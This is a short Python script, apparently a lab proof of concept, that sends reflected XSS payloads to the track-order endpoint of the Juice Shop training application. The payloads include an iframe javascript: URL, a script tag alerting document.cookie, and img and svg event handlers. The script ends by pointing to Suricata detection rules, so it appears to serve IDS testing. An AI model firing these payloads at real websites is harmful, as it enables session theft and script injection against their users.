#!/usr/bin/env python3
"""XSS - Reflected XSS via order tracking in Juice Shop."""

import requests
import sys
import urllib.parse

TARGET = "http://juice-shop:3000"

def main():
    print("[*] XSS - Reflected XSS PoC")
    print(f"[*] Target: {TARGET}")
    print()

    # Reflected XSS via track-order endpoint
    xss_payload = '<iframe src="javascript:alert(`xss`)">'
    encoded = urllib.parse.quote(xss_payload)

    url = f"{TARGET}/rest/track-order/{encoded}"

    print(f"[*] XSS Payload: {xss_payload}")
    print(f"[*] Sending GET to {TARGET}/rest/track-order/<payload>")
    print()

    try:
        resp = requests.get(url, timeout=10)
        print(f"[*] Status Code: {resp.status_code}")
        print(f"[*] Response length: {len(resp.text)} bytes")

        # Check if payload is reflected
        if xss_payload in resp.text or "iframe" in resp.text.lower():
            print("[+] SUCCESS! XSS payload reflected in response!")
        else:
            print("[*] Payload sent - checking for partial reflection...")

        print()
        print(f"[*] Response body (first 500 chars):")
        print(resp.text[:500])

        # Send additional requests with different XSS vectors
        vectors = [
            "<script>alert(document.cookie)</script>",
            '<img src=x onerror=alert("xss")>',
            '<svg onload=alert("xss")>',
        ]
        print()
        print("[*] Sending additional XSS vectors...")
        for v in vectors:
            enc = urllib.parse.quote(v)
            r = requests.get(f"{TARGET}/rest/track-order/{enc}", timeout=10)
            print(f"  Payload: {v[:50]:50s} -> Status: {r.status_code}")

    except requests.ConnectionError:
        print("[-] ERROR: Could not connect to Juice Shop")
        sys.exit(1)
    except Exception as e:
        print(f"[-] ERROR: {e}")
        sys.exit(1)

    print()
    print("[*] Attack complete. Check Suricata alerts for SID 100003, 100004.")

if __name__ == "__main__":
    main()
